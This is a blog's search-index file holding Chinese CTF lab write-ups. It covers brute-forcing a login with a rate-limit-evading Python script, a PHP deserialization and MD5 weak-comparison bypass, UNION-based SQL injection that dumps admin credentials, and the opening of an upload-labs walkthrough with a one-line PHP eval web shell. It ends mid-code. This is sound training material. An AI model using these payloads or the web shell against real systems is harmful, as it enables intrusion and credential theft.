<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUCTF 刷题笔记——Basic 2</title>
      <link href="/posts/a080afff/"/>
      <url>/posts/a080afff/</url>
      
        <content type="html"><![CDATA[<h1>BUUCTF 刷题笔记——Basic 2</h1><h2 id="BUU-BRUTE-1">BUU BRUTE 1</h2><h3 id="启动靶机-4">启动靶机</h3><ul><li><p>打开只有一个简单的登录界面</p><img src="0001.webp" alt="" style="zoom: 65%;" /></li></ul><h3 id="研究页面-2">研究页面</h3><ul><li><p>随便输入一个账户和密码测试一下：</p><img src="0002.webp" alt="" style="zoom: 65%;" /><p>提示用户名错误，并且用户名和密码均在 URL 中显示，因此为 <kbd>GET</kbd> 请求。</p></li><li><p>目测需要暴力破解（<kbd>BRUTE</kbd>），首先测试常用用户名和密码 <kbd>admin</kbd>：</p><img src="0003.webp" alt="" style="zoom: 65%;" /><p>依然错误，但是提示信息变成了密码错误，且明确告诉我们密码为四位数字。</p></li><li><p>因此，用户名 <kbd>admin</kbd> 是正确的，现在只需对四位数字的密码进行暴力破解即可，那问题就简单了。</p></li></ul><h3 id="暴力破解">暴力破解</h3><ul><li><p>四位数字的遍历写一个简单的 Python 程序即可完成，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;[靶机地址]/?username=admin&amp;password=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9999</span>):</span><br><span class="line">    res = requests.get(url + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> res.text != <span class="string">&quot;密码错误，为四位数字。&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>其中 <kbd>requests.get()</kbd> 通过 <kbd>GET</kbd> 方法向靶机发起请求，<kbd>res.text</kbd> 则回去请求返回的文本，并且我们已知密码错误时返回的文本内容为『密码错误，为四位数字。』，因此直接比对即可。</p></li><li><p>上述代码虽说已经能够完成四位数密码的暴力破解，但是很遗憾，并不能用于实战，至少在 BUU 不行，因为请求频率过高，目前实测请求五十次左右就会报 429 错误。最终密码为 <kbd>6490</kbd>，以这个频率限制的话，暴力破解将会比较麻烦。</p></li><li><p>我的解决方法是在代码中添加 <kbd>time.sleep()</kbd> ，当请求遇到任何问题就让程序暂停以强行降低频率。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;[靶机地址]/?username=admin&amp;password=&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">9999</span>:</span><br><span class="line">    res = requests.get(url + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot;: &quot;</span> + <span class="built_in">str</span>(res.status_code))</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> res.text != <span class="string">&quot;密码错误，为四位数字。&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> res.status_code != <span class="number">200</span>:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            i = i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(res.text)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li><li><p>等待几分钟可以看到输出了登录成功的提示，后面接着的便是 <kbd>flag</kbd>，虽然可以顺利完成，但是依然不够优雅，再留个坑，希望以后能找到更优雅的 <psw>暴力</psw> 方法。</p><img src="0004.webp" alt="" style="zoom: 65%;" /></li></ul><h2 id="BUU-CODE-REVIEW-1">BUU CODE REVIEW 1</h2><h3 id="启动靶机-5">启动靶机</h3><ul><li><p>直接就是一段代码：</p><img src="0005.webp" alt="" style="zoom: 65%;" /></li></ul><h3 id="代码审计-2">代码审计</h3><ul><li><p>注释和语法高亮函数 <kbd>highlight_file()</kbd> 就不用审了，首先看这个 BUU 类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="comment">// 类中包含两个成员变量</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="comment">// 析构函数，类的生命末期自动调用</span></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           <span class="comment">// uniqid() 函数基于以微秒计的当前时间,生成一个唯一的 ID。</span></span><br><span class="line">           <span class="comment">// base64_encode()  使用 base64 对 ID 进行编码</span></span><br><span class="line">           <span class="comment">// 因此变量 correct 中存储的是运行时才能确定的未知量</span></span><br><span class="line">           <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;correct === <span class="keyword">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">               <span class="comment">// 但 correct 与 input 的值相同则输出 flag</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>代码的解析已置于注释中，由该类可以判断，要使程序输出 <kbd>flag</kbd>，则必须让 <kbd>correct</kbd> 与 <kbd>input</kbd> 变量中的值相同。可以让 <kbd>input</kbd> 中的值等于 <kbd>correct</kbd> 变量的引用，相当于两个变量同时指向同一个值，这样在析构函数对 <kbd>correct</kbd> 操作时，也等价于对 <kbd>input</kbd> 进行操作，即实现了两个变量的<strong>动态</strong>相等。只需如下构建类即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> BUU();</span><br><span class="line"><span class="variable">$a</span>-&gt;correct = &amp;<span class="variable">$a</span>-&gt;input;</span><br></pre></td></tr></table></figure></li><li><p>要利用上述方法夺旗，后面这段代码就很重要了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pleaseget&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pleasepost&#x27;</span>] === <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>]) == md5(<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &#123;</span><br><span class="line">            unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码一共获取了五个变量，其中 <kbd>pleaseget</kbd> 通过 <kbd>GET</kbd> 方法而其他均通过 <kbd>POST</kbd> 方法。值得注意的是嵌套的 <kbd>if</kbd> 语句最终执行的是 <kbd>unserialize()</kbd> 函数，这个函数的作用就是反序列化。</p></li><li><p>首先研究一下什么叫序列化，PHP官方文档对 <a href="https://www.php.net/manual/zh/language.oop5.serialization.php">对象序列化</a> 有着全面的解。其实序列化就是将一个 php 值转化为一个包含字节流的字符串，方便存储与传递，可直接调用 <kbd>serialize()</kbd> 方法完成序列化，具体实现可参考 <a href="https://www.php.net/manual/zh/function.serialize.php">官方文档</a>。而将字符串变回原来的值，则称为<strong>反序列化</strong>。如前文所述，要程序输出 <kbd>flag</kbd>，就需要我们实例化一个 BUU 类的对象并将变量 <kbd>correct</kbd> 初始化为变量<kbd>input</kbd> 的引用。这个步骤直接传递代码肯定是无法实现的，但是利用反序列化函数 <kbd>unserialize()</kbd> 即可将一串序列化后的字符转化为该对象。而获取这串序列化字符串可通过这段代码直接获取：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> BUU();</span><br><span class="line"><span class="variable">$a</span>-&gt;correct = &amp;<span class="variable">$a</span>-&gt;input;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于序列化只保存变量，因此这里构建 BUU 类只需保留两个变量即可，这段程序的最终输出结果即为我们所需要的序列化字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;BUU&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;correct&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;input&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure></li><li><p>在将序列化字符串传递给变量 <kbd>obj</kbd> 之前，还需要通过嵌套 <kbd>if</kbd> 语句，即变量 <kbd>pleaseget</kbd> 值为 <kbd>1</kbd>，变量 <kbd>pleasepost</kbd> 值为 <kbd>2</kbd>，变量 <kbd>md51</kbd> 与变量 <kbd>md52</kbd> 值不相等，但是他们的 MD5 值要弱相等。前面两个实现较为简单，最后一个条件就非常有意思了。在变量值不同的情况下保持 MD5 值弱相同，有两种实现方法：</p><ol><li><p>第一种方法是利用 <kbd>md5()</kbd> 无法处理数组而返回 <kbd>null</kbd> 的特性，将两个变量赋值为两个不同的数组即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md51[]=1&amp;md52[]=2</span><br></pre></td></tr></table></figure></li><li><p>第二种方法则是利用弱相等，在 PHP 中弱相等会先将值转化为相同类型后进行比较，其中如果字符串没有包含 <kbd>.</kbd>，<kbd>e</kbd>，<kbd>E</kbd> 并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值。而如果字符串前两个字符为 <kbd>0e</kbd>，表示 <kbd>0</kbd> 的多次幂，则字符串的值将始终为零。因此，只需找出 MD5 值以 <kbd>0e</kbd> 开头的值即可，常见的有如下几个：</p><table><thead><tr><th style="text-align:center">字符串</th><th style="text-align:center">MD5值</th></tr></thead><tbody><tr><td style="text-align:center">QNKCDZO</td><td style="text-align:center">0e830400451993494058024219903391</td></tr><tr><td style="text-align:center">s878926199a</td><td style="text-align:center">0e545993274517709034328855841020</td></tr><tr><td style="text-align:center">s155964671a</td><td style="text-align:center">0e342768416822451524974117254469</td></tr><tr><td style="text-align:center">s214587387a</td><td style="text-align:center">0e848240448830537924465865611904</td></tr><tr><td style="text-align:center">s214587387a</td><td style="text-align:center">0e848240448830537924465865611904</td></tr><tr><td style="text-align:center">s878926199a</td><td style="text-align:center">0e545993274517709034328855841020</td></tr><tr><td style="text-align:center">s1091221200a</td><td style="text-align:center">0e940624217856561557816327384675</td></tr><tr><td style="text-align:center">s1885207154a</td><td style="text-align:center">0e509367213418206700842008763514</td></tr></tbody></table><p>只需将两个变量赋值为其中任意两个不同的字符串即可。</p></li></ol></li></ul><h3 id="装载数据">装载数据</h3><ul><li><p>由上最终需要传递的变量值就确定了，其中通过 <kbd>GET</kbd> 方法传递的变量只需将赋值置于 URL 后即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[靶机地址]/?pleaseget=1</span><br></pre></td></tr></table></figure></li><li><p>而通过 <kbd>POST</kbd> 方法传递的变量则需要通过 <kbd>HackBar</kbd> 工具来完成，首先构造 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><p>或者是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pleasepost=2&amp;md51=s878926199a&amp;md52=s1885207154a&amp;obj=O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure></li><li><p>浏览器 <kbd>F12</kbd> 选择 <kbd>HackBar</kbd>，在 URL 后加入 <kbd>GET</kbd> 部分数据，在 <kbd>Post data</kbd> 框中输入 <kbd>POST</kbd> 部分数据，点击 <kbd>Execute</kbd> 即可。</p><img src="0006.webp" alt="" style="zoom: 65%;" /></li><li><p>在页面的最后，就会出现想要的数据！</p><img src="0007.webp" alt="" style="zoom: 65%;" /></li></ul><h2 id="BUU-SQL-COURSE-1">BUU SQL COURSE 1</h2><h3 id="启动靶机-6">启动靶机</h3><ul><li><p>BUU 新闻网，看起来还挺丰富，得好好研究研究！</p><img src="0008.webp" alt="" style="zoom: 65%;" /></li></ul><h3 id="研究页面-3">研究页面</h3><ul><li><p>一共五个可点击部分，热点列表有三个新闻可点击，分别为以下内容：</p><img src="0009.webp" alt="" style="zoom: 65%;" /><p>点击登录按钮即可进入登录页面，可输入用户名密码后登录，当然我们并不知道用户名与密码：</p><img src="0010.webp" alt="" style="zoom: 65%;" /><p>点击热点按钮则又会回到首页得热点列表，目测这个按钮对我们没有任何帮助。</p></li><li><p>先测试简单账户名和密码 <kbd>admin</kbd>，果然还是提示错误，URL 没有变化，因此是通过 <kbd>POST</kbd> 方法请求提交的。</p><img src="0011.webp" alt="" style="zoom: 65%;" /></li><li><p>尝试了万能密码以及各自闭合之后，依然提示错误，应该是没办法通过登录界面直接注入了。说来也是，人家设置这么多界面，万能密码就给注入成功了也太不像话了。所以转战其他页面寻找注入点，在之前的预览中，三个热点貌似都没有什么需要提交的表单，因此 <kbd>F12</kbd> 看看后台的请求。</p></li><li><p>从首页点进 <kbd>测试新闻1</kbd> 可以看到浏览器多了一个请求，并且通过 <kbd>GET</kbd> 方法提交了 <kbd>id</kbd> 的数据。那么就可以从这里开始尝试注入！</p><img src="0012.webp" alt="" style="zoom: 65%;" /></li><li><p>经测试，<kbd>id</kbd> 赋值为 <kbd>1</kbd>、 <kbd>2</kbd>、 <kbd>3</kbd> 分别返回三条新闻的内容，当然这并没有什么用。我们需要先当前 <kbd>SQL</kbd> 语句查询的数据库中表的列数，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 order by 2--+</span><br></pre></td></tr></table></figure><kbd>--+</kbd> 表示注释防止 <kbd>SQL</kbd> 语句后续部分干扰，本题也可省略。<kbd>order by</kbd> 表示按对应列排序，后面的数字则表示第几列。数字为 <kbd>2</kbd> 时浏览器能够正常回显，说明当前 <kbd>SQL</kbd> 语句至少查询了两列数据。<img src="0013.webp" alt="" style="zoom: 65%;" /><p>当数字修改为 <kbd>2</kbd> 时浏览器无回显，说明当前 <kbd>SQL</kbd> 语句仅查询了两列数据。</p><img src="0014.webp" alt="" style="zoom: 65%;" /></li><li><p>接下来判断回显位，即测试有几列数据可以回显至浏览器中，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,2--+</span><br></pre></td></tr></table></figure><p>其中 <kbd>id</kbd> 赋值为 <kbd>-1</kbd>是为了使当前查询语句前半句查找失败，这样浏览器收到的回显就会是我们自己构造的后半段查询结果。当然，后面的数字序列可以为任意数字，因为该查询语句并没有向任何数据块查询，而是直接返回后方的数字序列。因此我们可以利用此来判断几列数据可用于回显。此前已知语句查询两列数据，而使用上述 <kbd>payload</kbd> 浏览器可以正常回显，可知查询的两列数据均可用于回显。</p><img src="0015.webp" alt="" style="zoom: 65%;" /><blockquote><p>害本来就是显示两组数据，不用测试都可以知道，不过这里还是练习一下。</p></blockquote></li><li><p>接下来就可以正式查找数据库中藏着的用户名与密码了！首先先看看有哪些数据库，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></table></figure><kbd>-1</kbd> 的作用同上，即让前部分查找语句失败从而回显后部分查找语句所查找到的内容。后部分查找语句中查找了两个部分，对应于可供回显的两部分数据，现在只需确认有哪些数据库，因此只需使用一部分数据，另一部分直接使用数字填充即可。当然，填充是必须的，若只提供一部分数据将导致查询失败而无法回显。<p>而要理解对所有数据库名的查询原理，首先我们要知道在 MySQL 中有一个自带的数据库 <kbd>information_schema</kbd>，该数据库用于存储数据库的元数据，即数据的数据，常用的各数据的结构如下图所示：</p><img src="0016.webp" alt="" style="zoom: 65%;" /><p>要查询所有数据库名，就需要查询该库中的 <kbd>schemata</kbd> 表下的字段 <kbd>schema_name</kbd>。而 <kbd>group_concat()</kbd> 函数则负责将全部数据整合到一起，在该语句中表示查找<strong>所有</strong>的数据库名。查询结果如图：</p><img src="0017.webp" alt="" style="zoom: 65%;" /><p>即共有六个数据库，其中 <kbd>information_schema</kbd>、<kbd>mysql</kbd>、<kbd>performance_schema</kbd> 为 MySQL 自带的数据库，因此，我们需要的数据将会在 <kbd>ctftraining</kbd> 或 <kbd>test</kbd> 或 <kbd>news</kbd> 三个数据库中。</p><blockquote><p>勿喷，下面我就会知道根本不用查询这些数据库，因为完全没用……</p></blockquote></li><li><p>理论上接下来查询这三个数据库中的数据即可，首先查询 <kbd>ctftraining</kbd> 数据库中又哪些表，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27;--+</span><br></pre></td></tr></table></figure><p>原理同上，其中由于需要指定数据库，因此要加上一个限定条件。查询结果如下：</p><img src="0018.webp" alt="" style="zoom: 65%;" /><p>可以看出该数据库中共有三张表，分别为 <kbd>FLAG_TABLE</kbd>、<kbd>news</kbd>、<kbd>users</kbd>，那么这个 <kbd>FLAG_TABLE</kbd> 表就很有意思了，我们要的就是 <kbd>flag</kbd> 啊！因此直接查一下这个表中的数据，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;FLAG_TABLE&#x27;--+</span><br></pre></td></tr></table></figure><p>查询到表中仅有一个字段 <kbd>FLAG_COLUMN</kbd>：</p><img src="0019.webp" alt="" style="zoom: 65%;" /><p>那么现在直接查询该字段数据！想得美！</p></li><li><p>很遗憾，一开始便犯了错误，我们能查这些数据库、表以及字段的名字，是因为 MySQL 默认保存了信息供我们查询，并不意味着就能直接拿到数据了。一开始寻找注入点时就应该知道，我们的操作范围只在<strong>注入点处所使用的数据库</strong>。因此不需要知道有哪些数据库，而需要知道当前使用那个数据库，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,database()--+</span><br></pre></td></tr></table></figure><p>其中 <kbd>database()</kbd> 函数就会返回当前数据库名称，浏览器回显值可以看出当前使用的数据库为 <kbd>news</kbd>：</p><img src="0020.webp" alt="" style="zoom: 65%;" /></li><li><p>接下来就要查询该数据库中有哪些表了，害，已经很熟了，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;news&#x27;--+</span><br></pre></td></tr></table></figure><p>当然若对数据库的名字并没有兴趣的话，上述两步其实完全可以合并：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p>根据浏览器回显可以看出该数据库中有两个表，根据名字肯定应优先考虑 <kbd>admin</kbd> 表。</p><img src="0021.webp" alt="" style="zoom: 65%;" /></li><li><p>那么就该查 <kbd>admin</kbd> 表中有哪些字段了，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;admin&#x27;--+</span><br></pre></td></tr></table></figure><p>查询出来共三个字段，分别是 <kbd>id</kbd>、<kbd>username</kbd>、<kbd>password</kbd>，那就很有意思了！</p><img src="0022.webp" alt="" style="zoom: 65%;" /></li><li><p>显然只要查询 <kbd>username</kbd> 和 <kbd>password</kbd> 两个字段中的数据我们就成功了！构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select username,password from admin--+</span><br></pre></td></tr></table></figure><p>非常普通的查询语句，可回显的两个位置分别显示用户名与密码，接下来这俩将明晃晃地显示在浏览器中：</p><img src="0023.webp" alt="" style="zoom: 65%;" /></li></ul><h3 id="正常登录">正常登录</h3><ul><li><p>将获取的用户名与密码在登录页面登录，于是：</p><img src="0024.webp" alt="" style="zoom: 65%;" /></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 暴力破解 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> SQL 注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs 完整训练</title>
      <link href="/posts/ddd5444f/"/>
      <url>/posts/ddd5444f/</url>
      
        <content type="html"><![CDATA[<h1>upload-labs 完整训练</h1><blockquote><p><strong>前言</strong></p><p>之前在 <a href="https://buuoj.cn/">BUUCTF</a> 刷题时有幸看到这个靶场项目，感觉非常不错，因此特地开篇博文记录完整的刷题过程，目前共计21关。最近开的坑有点多，不过，既然开了那就一定会完成的🎉！第一关在此前的 <a href="https://h-t-m.top/posts/3989fe45/">BUUCTF 刷题笔记——Basic 1</a> 中已经完成，为保证完整性，本文也同步记录第一关。其中 Pass-01~04、Pass-06~07、Pass-20 靶机部署于 Linux 系统，Pass-5、Pass-12~14、Pass-16~21 靶机部署于本地，其余均部署于 Windows 系统。至于为什么部署这么乱，正文会解释的……</p><p>由于图片数量非常可观，因此本文中出现的图片全部存储于 <a href="https://7bu.top/">去不图床</a> ，若失效或遇到其他问题请及时联系本人。</p><p>特别感谢平台作者 <a href="https://github.com/c0ny1">c0ny1</a></p></blockquote><h2 id="Pass-01">Pass-01</h2><h3 id="启动靶机-11">启动靶机</h3><ul><li><p>打开网页，页面还是挺好看的，虽然这并不重要。</p><img src="https://bu.dusays.com/2022/05/11/627bdb291eba0.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究页面-4">研究页面</h3><ul><li><p>既然有上传图片的功能，那就上传一张看看。</p><img src="https://bu.dusays.com/2022/05/09/6278b01318dc0.webp" alt="" style="zoom: 75%;" /></li><li><p>一切正常，根据图片 url 可以看出文件被上传至网页目录的 <kbd>upload</kbd> 目录下。</p><img src="https://bu.dusays.com/2022/05/09/6278b014a5ce5.webp" alt="" style="zoom: 75%;" /></li><li><p>再上传一个其他文件看看，被阻止了，说是只支持 <kbd>jpg/png/gif</kbd> 三种文件，老实说不支持 <kbd>webp</kbd> 我不是很认可。</p><img src="https://bu.dusays.com/2022/05/09/6278b01603cf6.webp" alt="" style="zoom: 75%;" /></li><li><p>也就是说，我们只能上传这三种文件，想通过上传我们的木马武装夺旗，就只能想办法突破这种限制。作为小白，理所应当地查看提示：</p><img src="https://bu.dusays.com/2022/05/09/6278b01702eed.webp" alt="" style="zoom: 75%;" /></li><li><p>使用 js 检查可还行，意味着检查在前端完成，而前端完全可以由我们自行操作！</p></li></ul><h3 id="突破限制-2">突破限制</h3><ul><li><p>这里可以先创建好一个文件，先编写好所谓的“一句话木马”。</p><blockquote><p><strong>一句话木马</strong></p><p>将仅含一行代码的程序文件上传至目标网站，如 PHP 代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;h-t-m&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><kbd>@</kbd> 表示其后代码即使出错也将不会报错。</li><li><kbd>eval()</kbd> 函数表示将参数当作代码来执行。</li><li><kbd>&#36;_POST[]</kbd> 表示以 post 方式获取变量。</li></ul><p>也就是说，我们将文件上传之后，即可用对应方法向网站提交代码并执行，这里使用 post 方法。虽然我们直接定义了自己的变量名 <kbd>h-t-m</kbd>，但是 <kbd>@</kbd> 可以保证不会报错。于是我们完全可以通过这个文件直接连接至服务器。</p></blockquote></li><li><p>由于只是  js 检查，为表示对检查的尊重，我们大可以嚣张一点，将文件名命名为 <kbd>木马.php</kbd>。</p><img src="https://bu.dusays.com/2022/05/09/6278b01801170.webp" alt="" style="zoom: 75%;" /></li><li><p>突破前端检查，可以直接修改对应的 js 代码，也可以直接在浏览器禁用 JavaScript ，或者直接删除 HTML 中对检查代码的调用。</p><p><strong>以下三种方法任选其一即可</strong></p><ul><li><p>修改 js 代码需要在控制台重构函数，直接原地修改无效。查看语句找到该检查函数如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            alert(<span 